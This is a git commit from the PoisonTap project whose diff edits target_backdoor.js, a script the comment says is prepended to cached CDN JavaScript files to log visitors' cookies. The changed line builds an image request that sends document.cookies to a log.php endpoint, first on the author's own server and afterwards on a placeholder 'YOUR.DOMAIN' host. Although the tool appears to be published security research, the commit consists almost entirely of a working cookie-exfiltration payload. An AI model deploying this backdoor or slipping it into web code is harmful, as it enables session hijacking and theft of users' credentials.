a2cf4fd5e6dea8dcb9bb8b6404094fb2252845d3
Samy Kamkar <git@samy.pl>
2016-11-16 14:14:18 -0800

    don't point to my server :)

--- target_backdoor.js
+++ target_backdoor.js
@@ -1,4 +1,4 @@
 /* This javascript is prepended and cached to many common JS files on the web such as Google's CDN files, found in the poisontap/js/ directory.
  * By default, it logs the domain's cookies. Change 'samy.pl' to your domain.
  */
-new Image().src='http://samy.pl/poisontap/log.php?log='+document.cookies;
+new Image().src='http://YOUR.DOMAIN/poisontap/log.php?log='+document.cookies;
